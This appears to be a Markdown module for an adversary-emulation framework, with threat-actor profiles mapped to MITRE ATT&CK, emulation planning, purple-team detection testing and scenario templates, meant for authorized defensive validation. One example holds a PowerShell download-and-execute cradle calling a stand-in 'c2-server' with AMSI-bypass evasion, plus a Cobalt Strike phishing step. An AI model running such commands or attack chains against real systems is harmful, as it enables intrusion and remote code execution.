---
name: "adversary-emulation"
category: "redteam"
version: "1.0.0"
tags: ["redteam", "adversary-emulation", "threat-actors", "apt-simulation", "mitre-attack"]
---

# Adversary Emulation Framework

## Overview

The Adversary Emulation module provides structured methodology and tooling for mapping, implementing, and testing against specific threat actor tactics, techniques, and procedures (TTPs). Unlike general penetration testing or red team operations, adversary emulation focuses on replicating the exact behaviors of known threat groups — APTs, cybercriminal organizations, insider threats — to test whether an organization can detect and respond to the specific threats most relevant to their industry and geography.

This module bridges threat intelligence and offensive operations. It translates threat intelligence reports (MITRE ATT&CK, vendor advisories, government alerts) into executable attack chains that can be tested in controlled environments. Each emulation includes TTP mapping, tool selection, infrastructure requirements, and detection validation.

Adversary emulation is particularly valuable for:
- **Threat-informed defense validation** — testing whether security controls detect specific adversary behaviors
- **Tabletop exercises** — providing realistic scenarios for incident response teams
- **Purple team operations** — collaborative testing between red and blue teams
- **Compliance requirements** — demonstrating threat-aware security testing

This module includes pre-built profiles for common threat actors and extensible templates for creating custom adversary profiles.

**Authorization is mandatory.** Adversary emulation involves implementing real attack techniques. Only conduct these activities with explicit written authorization and proper isolation.

## Core Capabilities

### 1. Threat Intelligence Processing
- Threat report parsing and TTP extraction
- MITRE ATT&CK mapping and coverage analysis
- Threat actor profiling (motivation, sophistication, targets, infrastructure)
- Campaign correlation and attribution support
- Threat landscape monitoring

### 2. Adversary Profile Development
- Pre-built profiles for known APT groups
- Custom adversary profile creation
- TTP selection and prioritization
- Tool and infrastructure mapping
- Detection opportunity identification

### 3. Emulation Execution
- Technique-by-technique implementation
- Automated attack chain execution
- Environment-aware adaptation
- Detection validation at each stage
- Operational security during emulation

### 4. Detection Validation
- Detection rule testing against specific TTPs
- Coverage gap identification
- False positive/negative analysis
- Alert quality assessment
- SOC workflow validation

### 5. Reporting and Intelligence Feedback
- Emulation results mapped to threat intelligence
- Detection capability gap analysis
- Threat intelligence validation
- Defensive improvement recommendations
- Intelligence cycle feedback

## Usage Examples

### Create an Adversary Profile

```python
from adversary_emulation import AdversaryProfile, ThreatActor, TTP

# Define threat actor
threat_actor = ThreatActor(
    name="APT29 (Cozy Bear)",
    aliases=["The Dukes", "CozyDuke", "NOBELIUM"],
    motivation="espionage",
    sophistication="advanced",
    country="Russia",
    associated_groups=["APT28", "Sandworm"],
    targeted_sectors=["government", "technology", "healthcare"],
    active_since="2008",
    tools=[
        "wellmess", "wellmail", "sorefang", "crutch", "noise",
        "miniDump", "lazagne", "certutil", "regsvr32", "mshta",
    ],
    infrastructure=[
        "compromised_websites", "bulletproof_hosting", "domain_fronting",
    ],
)

# Map TTPs from threat intelligence
ttps = [
    TTP(
        technique_id="T1566.001",
        name="Spearphishing Attachment",
        description="Sends spearphishing emails with malicious attachments",
        tools=["macro_documents", "iso_files"],
        detection="email_gateway, endpoint_detection",
    ),
    TTP(
        technique_id="T1059.001",
        name="PowerShell",
        description="Uses PowerShell for execution, often with encoded commands",
        tools=["powershell_encoded", "powershell_download"],
        detection="script_block_logging, module_logging",
    ),
    TTP(
        technique_id="T1053.005",
        name="Scheduled Task",
        description="Creates scheduled tasks for persistence and execution",
        tools=["schtasks", "xml_task_creation"],
        detection="task_creation_events, sysmon",
    ),
    TTP(
        technique_id="T1003.002",
        name="Security Account Manager",
        description="Dumps SAM database for credential extraction",
        tools=["reg_save", "secretsdump"],
        detection="reg_access_monitoring, credential_dump_detection",
    ),
    TTP(
        technique_id="T1041",
        name="Exfiltration Over C2 Channel",
        description="Exfiltrates data over the established C2 channel",
        tools=["https_c2", "dns_tunneling"],
        detection="network_traffic_analysis, dlp",
    ),
]

# Create adversary profile
profile = AdversaryProfile(
    threat_actor=threat_actor,
    ttps=ttps,
    emulation_scope="external_network",
    target_environment="enterprise_windows",
    skill_level_required="advanced",
    estimated_duration_weeks=8,
    team_size=3,
)
```

### Execute Adversary Emulation

```python
from adversary_emulation import EmulationPlan, EmulationExecution, TechniqueExecution

# Create emulation plan
plan = EmulationPlan(
    profile=profile,
    objectives=[
        "Gain initial access via phishing",
        "Establish persistence",
        "Escalate to domain admin",
        "Exfiltrate simulated sensitive data",
    ],
    constraints={
        "no_destructive_actions": True,
        "preserve_evidence": True,
        "coordinate_with_blue_team": False,  # stealth test
        "business_hours_only": False,
    },
    detection_validation=True,
)

# Execute emulation
emulation = EmulationExecution(plan)

# Phase 1: Initial Access
phase1 = emulation.execute_technique(
    technique="T1566.001",
    implementation={
        "method": "spearphishing_attachment",
        "payload": "macro_document_with_cobalt_strike",
        "delivery": "email",
        "targets": ["executives@target.com"],
    },
    opsec=True,
    validate_detection=True,
)

# Phase 2: Execution
phase2 = emulation.execute_technique(
    technique="T1059.001",
    parent=phase1,
    implementation={
        "method": "powershell_encoded",
        "command": "IEX(New-Object Net.WebClient).DownloadString('http://c2-server/payload')",
        "evasion": "amsi_bypass, script_block_logging_evasion",
    },
    opsec=True,
    validate_detection=True,
)

# Phase 3: Persistence
phase3 = emulation.execute_technique(
    technique="T1053.005",
    parent=phase2,
    implementation={
        "method": "scheduled_task",
        "task_name": "SystemUpdateCheck",
        "trigger": "logon",
        "action": "powershell_encoded_command",
    },
    opsec=True,
    validate_detection=True,
)

# Continue through all techniques...
results = emulation.get_results()
```

### Automated TTP Execution

```python
from adversary_emulation import TTPExecutor, TTPChain

# Define a TTP chain (attack path)
ttp_chain = TTPChain(
    name="APT29 Initial Access to Exfiltration",
    profile=profile,
    techniques=[
        {"id": "T1566.001", "order": 1, "parent": None},
        {"id": "T1204.002", "order": 2, "parent": "T1566.001"},
        {"id": "T1059.001", "order": 3, "parent": "T1204.002"},
        {"id": "T1053.005", "order": 4, "parent": "T1059.001"},
        {"id": "T1003.002", "order": 5, "parent": "T1053.005"},
        {"id": "T1021.002", "order": 6, "parent": "T1003.002"},
        {"id": "T1041", "order": 7, "parent": "T1021.002"},
    ],
)

# Execute entire chain
executor = TTPExecutor(
    profile=profile,
    chain=ttp_chain,
    environment="enterprise_windows",
    opsec_level="high",
    detection_validation=True,
)

results = executor.execute_chain(
    auto_adapt=True,  # adapt to environment if technique fails
    max_retries=3,
    timeout_per_technique=300,
    evidence_capture=True,
)

# Review results
for result in results:
    print(f"Technique: {result.technique_id} - {result.technique_name}")
    print(f"  Success: {result.success}")
    print(f"  Detected: {result.detected}")
    print(f"  Detection Time: {result.detection_time_seconds}s")
    print(f"  Evidence: {result.evidence_path}")
    print()
```

### Purple Team Detection Validation

```python
from adversary_emulation import PurpleTeamExercise, DetectionTest

# Create purple team exercise
purple_team = PurpleTeamExercise(
    profile=profile,
    blue_team_involved=True,
    real_time_communication=True,
    shared_workspace="purple_team_channel",
)

# Test specific detection capabilities
detection_tests = [
    DetectionTest(
        technique="T1003.002",
        name="SAM Database Dump Detection",
        expected_detection="credential_dump_monitoring",
        test_method="reg_save_sam",
        validation_criteria=[
            "alert_generated",
            "alert_within_seconds(300)",
            "correct_technique_identified",
            "incident_created",
        ],
    ),
    DetectionTest(
        technique="T1053.005",
        name="Suspicious Scheduled Task Detection",
        expected_detection="task_creation_monitoring",
        test_method="create_suspicious_task",
        validation_criteria=[
            "alert_generated",
            "task_creation_event_logged",
            "correctly_flagged_as_suspicious",
        ],
    ),
]

# Execute detection tests
results = purple_team.run_detection_tests(detection_tests)

# Generate detection gap analysis
gaps = purple_team.analyze_detection_gaps(results)
for gap in gaps:
    print(f"Detection Gap: {gap.technique}")
    print(f"  Current Coverage: {gap.coverage_level}")
    print(f"  Gap Description: {gap.description}")
    print(f"  Recommended Fix: {gap.remediation}")
    print()
```

### Generate Emulation Report

```python
from adversary_emulation import EmulationReport, TTPCoverage

# Create report
report = EmulationReport(
    profile=profile,
    execution_results=results,
    detection_results=detection_test_results,
)

# Analyze TTP coverage
coverage = TTPCoverage(profile=profile, results=results)
print(f"\n=== TTP Coverage Analysis ===")
print(f"Total TTPs in profile: {coverage.total_ttps}")
print(f"TTPs executed: {coverage.executed_ttps}")
print(f"TTPs successful: {coverage.successful_ttps}")
print(f"TTPs detected: {coverage.detected_ttps}")
print(f"Detection rate: {coverage.detection_rate}%")
print(f"Mean time to detect: {coverage.mean_time_to_detect}s")

# Coverage by tactic
for tactic, stats in coverage.by_tactic.items():
    print(f"\n{tactic}:")
    print(f"  Executed: {stats.executed}/{stats.total}")
    print(f"  Detected: {stats.detected}/{stats.executed}")

# Generate full report
report.generate(
    format="docx",
    output_path="./reports/adversary_emulation_report.docx",
    include_ttp_matrix=True,
    include_detection_analysis=True,
    include_remediation=True,
    classification="CONFIDENTIAL",
)
```

## Best Practices

### Threat Intelligence Integration
1. **Start with threat intelligence.** Emulation should be driven by real threat data, not theoretical attack scenarios.
2. **Validate threat intelligence.** Use emulation to test whether reported TTPs are accurate and applicable to your environment.
3. **Update profiles regularly.** Threat actors evolve their TTPs. Keep adversary profiles current with latest intelligence.
4. **Map to MITRE ATT&CK.** Use the ATT&CK framework as the common language for TTP documentation and analysis.

### Emulation Execution
1. **Be faithful to the threat actor.** The value of emulation is in realistic simulation. Don't take shortcuts that diverge from actual adversary behavior.
2. **Environment-aware adaptation.** Real adversaries adapt to their environment. Your emulation should too — but document all adaptations.
3. **Validate detection at each stage.** Don't wait until the end to test detection. Check after each technique whether the blue team detected it.
4. **Maintain operational security.** Even in controlled environments, practice the OPSEC that the real adversary would use.

### Purple Team Collaboration
1. **Establish clear communication channels.** Purple team exercises require real-time coordination between red and blue teams.
2. **Share TTP details in advance (or not).** Depending on the exercise goals, share technique details to test detection rules, or keep them secret to test SOC response.
3. **Focus on detection gaps.** The primary output should be actionable improvements to detection and response capabilities.
4. **Document everything.** Both teams should document observations for post-exercise analysis.

### Reporting and Improvement
1. **Quantify detection coverage.** Use metrics like detection rate, mean time to detect, and coverage by tactic.
2. **Prioritize remediation by threat relevance.** Focus on TTPs used by threat actors most likely to target your organization.
3. **Provide intelligence feedback.** Emulation results can validate or refute threat intelligence assumptions.
4. **Track improvement over time.** Repeat exercises to measure improvement in detection capabilities.

## Related Modules

- **red-team-operations** — Full-scope adversary simulation with operational planning
- **penetration-testing** — Technical vulnerability assessment and exploitation
- **redteam-mindset** — Operational discipline for offensive security
- **hunt-api-misconfig** — API security testing for specific adversary techniques
- **hunt-ato** — Account takeover techniques used by adversary groups
- **hunt-cloud-misconfig** — Cloud infrastructure misconfigurations exploited by APTs
- **hunt-llm-ai** — AI/LLM security testing for emerging adversary techniques
- **web2-vuln-classes** — Web vulnerability reference for adversary tool selection

---

## Advanced Adversary Emulation Topics

### MITRE ATT&CK Enterprise Coverage Matrix

The MITRE ATT&CK framework defines 14 tactical categories with hundreds of techniques. Effective adversary emulation maps directly to this framework for each threat actor profile. The following table shows common tactics and the most frequently emulated techniques per category:

```markdown
| Tactic               | Technique ID   | Technique Name                          | Common APT Groups        |
|----------------------|----------------|------------------------------------------|--------------------------|
| Reconnaissance       | T1595.001      | Active Scanning: Scanning IP Blocks      | APT29, APT38             |
| Resource Development | T1583.001      | Acquire Infrastructure: Domains          | FIN7, APT41              |
| Initial Access       | T1566.001      | Spearphishing Attachment                 | APT28, APT29, Lazarus    |
| Execution            | T1059.001      | PowerShell                               | APT29, APT3, Carbanak    |
| Persistence          | T1547.001      | Registry Run Keys / Startup Folder       | APT29, APT1              |
| Privilege Escalation | T1068          | Exploitation for Privilege Escalation    | APT38, Equation Group     |
| Defense Evasion      | T1027.002      | Software Packing                         | APT41, Turla             |
| Credential Access    | T1003.001      | LSASS Memory                             | APT29, FIN7              |
| Discovery            | T1087.002      | Domain Account Discovery                 | APT1, APT28              |
| Lateral Movement     | T1021.002      | SMB/Windows Admin Shares                 | APT29, APT3              |
| Collection           | T1005          | Data from Local System                   | APT28, APT41             |
| Command and Control  | T1071.001      | Web Protocols: HTTP                      | All APTs                 |
| Exfiltration         | T1041          | Exfiltration Over C2 Channel             | APT29, Lazarus           |
| Impact               | T1486          | Data Encrypted for Impact                | APT29, Sandworm          |
```

### Threat Actor Profile Templates

#### APT28 (Fancy Bear) — Russian Military Intelligence

```python
apt28_profile = {
    "name": "APT28 (Fancy Bear)",
    "aliases": ["Fancy Bear", "Sofacy", "Pawn Storm", "STRONTIUM"],
    "attribution": "Russia - GRU Unit 26165",
    "motivation": "Espionage, geopolitical intelligence",
    "sophistication": "Advanced",
    "active_since": "2004",
    "targeted_sectors": [
        "Government", "Defense", "Media", "Sports organizations",
        "Political campaigns", "Think tanks"
    ],
    "targeted_countries": [
        "United States", "Ukraine", "Georgia", "NATO members",
        "European Union", "Turkey"
    ],
    "preferred_ttps": {
        "initial_access": [
            {"id": "T1566.001", "name": "Spearphishing Attachment",
             "details": "Weaponized Office documents with VBA macros, often lure content related to geopolitical events"},
            {"id": "T1566.002", "name": "Spearphishing Link",
             "details": "Links to credential harvesting pages mimicking webmail portals"},
            {"id": "T1195.002", "name": "Supply Chain Compromise",
             "details": "Compromise of software update mechanisms"},
        ],
        "execution": [
            {"id": "T1059.001", "name": "PowerShell",
             "details": "Encoded PowerShell commands, often using DownloadString or IEX"},
            {"id": "T1204.002", "name": "User Execution: Malicious File",
             "details": "Document-based payloads requiring user to enable macros"},
        ],
        "persistence": [
            {"id": "T1547.001", "name": "Registry Run Keys",
             "details": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
            {"id": "T1053.005", "name": "Scheduled Task",
             "details": "Scheduled tasks mimicking system update processes"},
        ],
        "credential_access": [
            {"id": "T1003.001", "name": "LSASS Memory",
             "details": "Mimikatz or custom credential dumping tools"},
            {"id": "T1110.003", "name": "Password Spraying",
             "details": "Low-and-slow password spraying against OWA/VPN"},
        ],
        "exfiltration": [
            {"id": "T1041", "name": "Exfiltration Over C2 Channel",
             "details": "Data encoded and sent over HTTPS C2 channels"},
            {"id": "T1048.003", "name": "Exfiltration Over Unencrypted Non-C2 Protocol",
             "details": "Exfiltration via DNS tunneling when HTTPS is monitored"},
        ],
    },
    "infrastructure": {
        "c2_servers": "Compromised legitimate websites, dedicated VPS",
        "redirectors": "Compromised WordPress sites, legitimate CDN abuse",
        "domain_fronting": "Cloudflare, Amazon CloudFront, Azure CDN",
        "ssl_certificates": "Let's Encrypt certificates on C2 domains",
        "hosting_preferences": "Bulletproof hosting in multiple jurisdictions",
    },
    "tools": [
        "X-Agent", "X-Tunnel", "Komplex", "LoJax", "VPNFilter",
        "CertUtil for download", "Regsvr32 for execution",
    ],
    "evasion_techniques": [
        "T1027.002 - Software Packing",
        "T1036.005 - Match Legitimate Name or Location",
        "T1562.001 - Disable or Modify Tools",
        "T1070.004 - File Deletion",
        "T1140 - Deobfuscate/Decode Files",
    ],
}
```

#### APT29 (Cozy Bear) — Russian Foreign Intelligence

```python
apt29_profile = {
    "name": "APT29 (Cozy Bear)",
    "aliases": ["The Dukes", "CozyDuke", "NOBELIUM", "SolarStorm"],
    "attribution": "Russia - SVR (Foreign Intelligence Service)",
    "motivation": "Espionage, strategic intelligence",
    "sophistication": "Advanced",
    "active_since": "2008",
    "targeted_sectors": [
        "Government", "Think tanks", "Technology", "Healthcare",
        "Defense contractors", "Energy"
    ],
    "preferred_ttps": {
        "initial_access": [
            {"id": "T1566.001", "name": "Spearphishing Attachment",
             "details": "Sophisticated phishing lures with zero-day exploits"},
            {"id": "T1199", "name": "Trusted Relationship",
             "details": "Compromise of trusted software vendors (e.g., SolarWinds)"},
            {"id": "T1078", "name": "Valid Accounts",
             "details": "Use of compromised credentials from prior breaches"},
        ],
        "execution": [
            {"id": "T1059.001", "name": "PowerShell",
             "details": "In-memory PowerShell execution without touching disk"},
            {"id": "T1059.003", "name": "Windows Command Shell",
             "details": "Living-off-the-land binaries for execution"},
        ],
        "defense_evasion": [
            {"id": "T1027.001", "name": "Binary Padding",
             "details": "Adding junk bytes to avoid hash-based detection"},
            {"id": "T1140", "name": "Deobfuscate/Decode Files",
             "details": "Multi-stage decoding of encrypted payloads"},
            {"id": "T1070.004", "name": "File Deletion",
             "details": "Secure deletion of all artifacts after use"},
        ],
        "credential_access": [
            {"id": "T1003.002", "name": "Security Account Manager",
             "details": "Registry save of SAM database"},
            {"id": "T1003.003", "name": "NTDS",
             "details": "DCSync attack to replicate Active Directory database"},
        ],
    },
    "infrastructure": {
        "c2_servers": "Cloud infrastructure (AWS, Azure, Google Cloud)",
        "redirectors": "Legitimate cloud services abused as redirectors",
        "domain_fronting": "Multi-layer domain fronting through CDN providers",
        "encryption": "Custom encryption over legitimate HTTPS channels",
        "steganography": "C2 communication hidden in image files",
    },
    "defensive_recommendations": [
        "Monitor for unusual Scheduled Task creation",
        "Deploy LSASS access monitoring (Sysmon Event ID 10)",
        "Enable PowerShell Script Block Logging",
        "Monitor for DCSync attack patterns",
        "Implement network segmentation for critical assets",
        "Monitor cloud service account authentication patterns",
    ],
}
```

#### Lazarus Group — North Korean State-Sponsored

```python
lazarus_profile = {
    "name": "Lazarus Group",
    "aliases": ["Hidden Cobra", "Zinc", "APT38", "Bureau 121"],
    "attribution": "North Korea - RGB (Reconnaissance General Bureau)",
    "motivation": "Financial gain, espionage, destructive operations",
    "sophistication": "Advanced",
    "active_since": "2009",
    "targeted_sectors": [
        "Financial institutions", "Cryptocurrency exchanges",
        "Technology", "Defense", "Media", "Healthcare"
    ],
    "notable_campaigns": [
        "SWIFT banking fraud (Bangladesh Bank 2016)",
        "WannaCry ransomware (2017)",
        "Cryptocurrency exchange thefts (multiple 2018-2024)",
        "IT worker infiltration scheme (2020-present)",
    ],
    "preferred_ttps": {
        "initial_access": [
            {"id": "T1566.001", "name": "Spearphishing Attachment",
             "details": "Job offer lures, fake cryptocurrency opportunities"},
            {"id": "T1566.002", "name": "Spearphishing Link",
             "details": "Links to compromised websites with browser exploits"},
            {"id": "T1195.002", "name": "Supply Chain Compromise",
             "details": "Trojanized software updates"},
        ],
        "execution": [
            {"id": "T1059.001", "name": "PowerShell",
             "details": "Encoded PowerShell with AMSI bypass"},
            {"id": "T1059.005", "name": "Visual Basic",
             "details": "VBA macros in weaponized documents"},
        ],
        "collection": [
            {"id": "T1005", "name": "Data from Local System",
             "details": "Targeted collection of financial and cryptocurrency data"},
            {"id": "T1114", "name": "Email Collection",
             "details": "Monitoring email for business intelligence"},
        ],
    },
    "financial_motive_techniques": [
        "SWIFT message manipulation",
        "Cryptocurrency wallet theft",
        "ATM jackpotting malware",
        "Ransomware deployment",
        "IT worker infiltration for payroll theft",
    ],
}
```

### Emulation Planning Workflow

A systematic emulation plan follows these phases:

```python
class EmulationPlanner:
    def __init__(self, threat_actor_profile):
        self.profile = threat_actor_profile
        self.phases = []

    def phase_1_intelligence_gathering(self):
        """Collect and analyze threat intelligence on the target actor"""
        return {
            "sources": [
                "MITRE ATT&CK groups page",
                "Vendor threat reports (Mandiant, CrowdStrike, Microsoft)",
                "Government advisories (CISA, NCSC)",
                "Conference presentations and research papers",
            ],
            "outputs": [
                "TTP list mapped to ATT&CK",
                "Infrastructure patterns",
                "Tool signatures and behaviors",
                "Targeting patterns",
            ],
            "duration": "1-2 weeks",
        }

    def phase_2_profile_construction(self):
        """Build the adversary profile from intelligence"""
        return {
            "components": {
                "actor_metadata": "Name, aliases, motivation, sophistication",
                "targeting_profile": "Sectors, geographies, specific targets",
                "ttp_mapping": "Techniques mapped to each ATT&CK tactic",
                "tool_inventory": "Tools, malware families, infrastructure",
                "detection_opportunities": "Where defenders can detect each TTP",
            },
            "outputs": [
                "Adversary profile document",
                "TTP priority list (most impactful first)",
                "Tool procurement/configuration plan",
            ],
            "duration": "1-2 weeks",
        }

    def phase_3_environment_assessment(self):
        """Assess the target environment for emulation feasibility"""
        return {
            "activities": [
                "Network topology review (if available)",
                "Security control inventory (EDR, SIEM, firewall)",
                "Log source inventory and retention",
                "Detection rule coverage analysis",
                "Historical incident data review",
            ],
            "outputs": [
                "Environment-specific emulation plan",
                "Feasibility assessment per TTP",
                "Detection gap identification",
                "Risk assessment for each technique",
            ],
            "duration": "1 week",
        }

    def phase_4_technique_selection(self):
        """Select and prioritize techniques for emulation"""
        return {
            "selection_criteria": [
                "Relevance to threat actor profile",
                "Feasibility in target environment",
                "Detection opportunity value",
                "Risk of detection",
                "Business impact if successful",
            ],
            "prioritization_matrix": {
                "high_priority": "Frequently used, high detection gap, low risk",
                "medium_priority": "Moderate usage or some detection coverage",
                "low_priority": "Rarely used or already well-detected",
            },
        }

    def phase_5_infrastructure_setup(self):
        """Prepare emulation infrastructure"""
        return {
            "components": [
                "C2 infrastructure (Cobalt Strike, Mythic, Sliver)",
                "Redirectors and domain fronting",
                "Phishing infrastructure (if applicable)",
                "Payload staging servers",
                "Logging and evidence capture",
            ],
            "opsec_requirements": [
                "Isolate from personal infrastructure",
                "Use legitimate-looking domains and certificates",
                "Implement proper traffic blending",
                "Set up monitoring for counter-detection",
            ],
        }

    def phase_6_execution(self):
        """Execute the emulation plan"""
        return {
            "execution_order": "Follow ATT&CK chain (Recon → Access → Persist → Escalate → Exfil)",
            "detection_validation": "Check for alerts after each technique",
            "adaptive_approach": "If detected, assess and potentially continue or pause",
            "evidence_capture": "Screenshot and log every action",
        }

    def phase_7_analysis_and_reporting(self):
        """Analyze results and produce report"""
        return {
            "analysis_areas": [
                "Detection rate per technique",
                "Mean time to detect (MTTD)",
                "Mean time to respond (MTTR)",
                "SOC workflow effectiveness",
                "Security control gaps",
            ],
            "report_sections": [
                "Executive Summary",
                "Threat Actor Profile Used",
                "Emulation Plan and Execution",
                "Detection Analysis",
                "Coverage Gap Analysis",
                "Remediation Recommendations",
                "MITRE ATT&CK Coverage Map",
            ],
        }
```

### MITRE ATT&CK Navigator Integration

Use the ATT&CK Navigator to visualize coverage and detection:

```python
def generate_navigator_layer(emulation_results):
    """Generate a layer file for the MITRE ATT&CK Navigator"""
    layer = {
        "name": "Emulation Results - Detection Coverage",
        "versions": {"attack": "14.0", "navigator": "4.8.0"},
        "domain": "enterprise-attack",
        "description": "Detection coverage from adversary emulation exercise",
        "techniques": [],
    }

    for result in emulation_results:
        score = 0
        color = "#fcf5a4"  # yellow = attempted, not detected

        if result.detected:
            score = 1
            color = "#76ff7a"  # green = detected

        if result.detected and result.detection_time < 300:
            score = 2
            color = "#00ff00"  # dark green = detected quickly

        layer["techniques"].append({
            "techniqueID": result.technique_id,
            "tactic": result.tactic,
            "score": score,
            "color": color,
            "comment": f"Detected: {result.detected}, Time: {result.detection_time}s",
            "enabled": True,
        })

    return layer
```

### Purple Team Detection Rule Testing

```python
class DetectionRuleTester:
    """Test detection rules against specific adversary techniques"""

    def __init__(self, detection_rules, siem_connection):
        self.rules = detection_rules
        self.siem = siem_connection

    def test_technique_detection(self, technique_id, execution_plan):
        """Test if a specific technique triggers detection rules"""
        before_events = self.siem.query(
            time_range="last_5_minutes",
            technique_id=technique_id,
        )

        # Execute technique
        execution_plan.execute()

        # Wait and collect events
        import time
        time.sleep(30)

        after_events = self.siem.query(
            time_range="last_5_minutes",
            technique_id=technique_id,
        )

        new_alerts = self.siem.get_new_alerts(
            since=before_events.latest_timestamp,
            technique_id=technique_id,
        )

        return {
            "technique": technique_id,
            "executed": True,
            "alerts_generated": len(new_alerts),
            "first_alert_time": new_alerts[0].timestamp if new_alerts else None,
            "rules_triggered": [alert.rule_name for alert in new_alerts],
            "detection_quality": self._assess_quality(new_alerts),
        }

    def _assess_quality(self, alerts):
        """Assess the quality of detection"""
        if not alerts:
            return "no_detection"

        quality_factors = {
            "accuracy": all(a.confidence > 0.8 for a in alerts),
            "timeliness": any(
                (a.timestamp - alerts[0].execution_time).seconds < 60
                for a in alerts
            ),
            "specificity": any(a.technique_id != "unknown" for a in alerts),
            "actionability": any(a.severity in ["high", "critical"] for a in alerts),
        }

        score = sum(quality_factors.values())
        if score == 4:
            return "excellent"
        elif score >= 3:
            return "good"
        elif score >= 2:
            return "moderate"
        else:
            return "poor"

    def coverage_analysis(self, emulation_results):
        """Analyze overall detection coverage"""
        total_techniques = len(emulation_results)
        detected = sum(1 for r in emulation_results if r.detected)
        undetected = total_techniques - detected

        coverage_by_tactic = {}
        for result in emulation_results:
            tactic = result.tactic
            if tactic not in coverage_by_tactic:
                coverage_by_tactic[tactic] = {"total": 0, "detected": 0}
            coverage_by_tactic[tactic]["total"] += 1
            if result.detected:
                coverage_by_tactic[tactic]["detected"] += 1

        return {
            "total_techniques": total_techniques,
            "detected_techniques": detected,
            "undetected_techniques": undetected,
            "detection_rate": (detected / total_techniques) * 100,
            "coverage_by_tactic": coverage_by_tactic,
            "gaps": [
                {"tactic": t, "technique": r.technique_id}
                for r in emulation_results
                if not r.detected
            ],
        }
```

### Common Adversary Infrastructure Patterns

Understanding adversary infrastructure helps with both emulation setup and detection:

| Infrastructure Type | Purpose | Detection Indicators |
|---------------------|---------|---------------------|
| C2 Servers | Command and control | Beaconing patterns, known C2 ports, JA3 hashes |
| Redirectors | Traffic relay, hide C2 | Unusual HTTP headers, redirect chains |
| Domain Fronting | Hide C2 destination via CDN | CDN IP to internal destination mismatch |
| Lookalike Domains | Phishing, brand impersonation | Newly registered domains, typosquatting |
| Bulletproof Hosting | Resist takedown requests | Hosting in permissive jurisdictions |
| Dead Drop Resolvers | Stage C2 configuration | Social media posts, pastes with encoded data |
| File Sharing Services | Payload delivery | Unusual file download patterns |
| Legitimate Services | C2 channel hiding | Cloud service abuse (Google, Dropbox, GitHub) |

### Threat Intelligence Feed Integration

```python
class ThreatIntelProcessor:
    """Process and integrate threat intelligence feeds into emulation plans"""

    STIX_TAXONOMY = {
        "threat_actor": "Threat Actor",
        "campaign": "Campaign",
        "attack_pattern": "Attack Pattern (ATT&CK Technique)",
        "malware": "Malware",
        "tool": "Tool",
        "infrastructure": "Infrastructure",
        "indicator": "Indicator of Compromise",
    }

    def __init__(self):
        self.indicators = []
        self.ttps = []
        self.malware_families = []

    def process_stix_bundle(self, stix_bundle):
        """Process a STIX 2.1 bundle of threat intelligence"""
        for obj in stix_bundle["objects"]:
            obj_type = obj["type"]

            if obj_type == "threat_actor":
                self._process_threat_actor(obj)
            elif obj_type == "attack-pattern":
                self._process_attack_pattern(obj)
            elif obj_type == "malware":
                self._process_malware(obj)
            elif obj_type == "indicator":
                self._process_indicator(obj)

    def _process_threat_actor(self, obj):
        """Extract threat actor information"""
        actor = {
            "name": obj["name"],
            "aliases": obj.get("aliases", []),
            "description": obj.get("description", ""),
            "motivations": [m.split("--")[1] for m in obj.get("goals", [])],
            "sophistication": obj.get("sophistication", "unknown"),
            "resource_level": obj.get("resource_level", "unknown"),
            "primary_motivation": obj.get("primary_motivation", "unknown"),
        }
        self.ttps.append(actor)

    def _process_attack_pattern(self, obj):
        """Extract ATT&CK technique information"""
        technique = {
            "name": obj["name"],
            "description": obj.get("description", ""),
            "external_references": obj.get("external_references", []),
            "kill_chain_phases": obj.get("kill_chain_phases", []),
        }

        for ref in technique["external_references"]:
            if ref.get("source_name") == "mitre-attack":
                technique["technique_id"] = ref.get("external_id")
                technique["url"] = ref.get("url")
                break

        self.ttps.append(technique)

    def _process_malware(self, obj):
        """Extract malware information"""
        malware = {
            "name": obj["name"],
            "description": obj.get("description", ""),
            "malware_types": obj.get("malware_types", []),
            "kill_chain_phases": obj.get("kill_chain_phases", []),
            "is_family": obj.get("is_family", False),
        }
        self.malware_families.append(malware)

    def _process_indicator(self, obj):
        """Extract IOCs for detection testing"""
        indicator = {
            "type": obj["pattern_type"],
            "pattern": obj["pattern"],
            "valid_from": obj.get("valid_from"),
            "valid_until": obj.get("valid_until"),
            "labels": obj.get("labels", []),
            "confidence": obj.get("confidence", 0),
        }
        self.indicators.append(indicator)

    def generate_emulation_intel_package(self):
        """Generate an intelligence package for emulation planning"""
        return {
            "threat_actors": self.ttps,
            "attack_techniques": [
                t for t in self.ttps if "technique_id" in t
            ],
            "malware_families": self.malware_families,
            "indicators": self.indicators,
            "summary": {
                "total_techniques": len(
                    [t for t in self.ttps if "technique_id" in t]
                ),
                "total_malware": len(self.malware_families),
                "total_indicators": len(self.indicators),
                "techniques_by_tactic": self._group_by_tactic(),
            },
        }

    def _group_by_tactic(self):
        """Group techniques by ATT&CK tactic"""
        by_tactic = {}
        for ttp in self.ttps:
            if "kill_chain_phases" in ttp:
                for phase in ttp["kill_chain_phases"]:
                    tactic = phase.get("phase_name", "unknown")
                    if tactic not in by_tactic:
                        by_tactic[tactic] = []
                    by_tactic[tactic].append(ttp["name"])
        return by_tactic
```

### Emulation Scenario Templates

#### Scenario 1: Ransomware Attack Simulation

```python
ransomware_scenario = {
    "name": "Ransomware Deployment Simulation",
    "threat_actor": "FIN7/Sodinokibi-inspired",
    "objectives": [
        "Gain initial access via phishing",
        "Escalate to domain admin",
        "Map and access file shares",
        "Simulate ransomware deployment (no actual encryption)",
    ],
    "techniques": [
        {"phase": "Initial Access", "technique": "T1566.001",
         "implementation": "Macro document with C2 beacon"},
        {"phase": "Execution", "technique": "T1059.001",
         "implementation": "PowerShell cradle to download second stage"},
        {"phase": "Persistence", "technique": "T1053.005",
         "implementation": "Scheduled task for re-execution"},
        {"phase": "Privilege Escalation", "technique": "T1003.001",
         "implementation": "LSASS memory dump for credential theft"},
        {"phase": "Lateral Movement", "technique": "T1021.002",
         "implementation": "SMB with compromised credentials"},
        {"phase": "Collection", "technique": "T1083",
         "implementation": "File share enumeration and staging"},
        {"phase": "Impact Simulation", "technique": "T1486",
         "implementation": "Place flag files on shares (no encryption)"},
    ],
    "safety_measures": [
        "No actual encryption of any files",
        "Use flag files to demonstrate access",
        "Coordinate with IR team for monitoring",
        "Have emergency stop procedure ready",
    ],
}
```

#### Scenario 2: Data Exfiltration Simulation

```python
exfiltration_scenario = {
    "name": "Sensitive Data Exfiltration Simulation",
    "threat_actor": "APT29-inspired",
    "objectives": [
        "Compromise external-facing application",
        "Pivot to internal network",
